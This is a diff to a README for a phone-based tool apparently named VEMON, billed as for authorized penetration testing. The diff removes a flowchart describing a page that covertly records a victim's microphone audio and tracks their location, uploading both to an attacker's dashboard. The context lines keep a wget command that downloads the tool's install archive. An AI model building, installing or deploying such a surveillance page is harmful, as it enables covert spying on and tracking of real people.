@@ -65,20 +65,6 @@ Designed for **authorized penetration testing**, **red-team engagements**, and *
 │   └── admin.html       # Operations dashboard (attacker-facing)
 └── recordings/          # Audio chunks saved here
 
-flowchart LR
-    A[Attacker: Termux] -->|serves page| B[Victim Browser]
-    B -->|"1 tap on paw"| C[getUserMedia audio]
-    B -->|"on load"| D[geolocation watchPosition]
-    C -->|"8s WebM chunks"| E["POST /upload"]
-    D -->|"lat,lng,accuracy"| F["POST /loc"]
-    E --> G[(Termux storage)]
-    E --> H[(Phone shared storage)]
-    F --> I[Reverse geocode]
-    I --> J[Area name]
-    G & H --> K[Admin dashboard /admin]
-    J --> K
----
-
 **Termux se direct upload:**
 ```bash
 wget https://github.com/onxx-x146/VEMON/raw/refs/heads/main/install.tar.gz
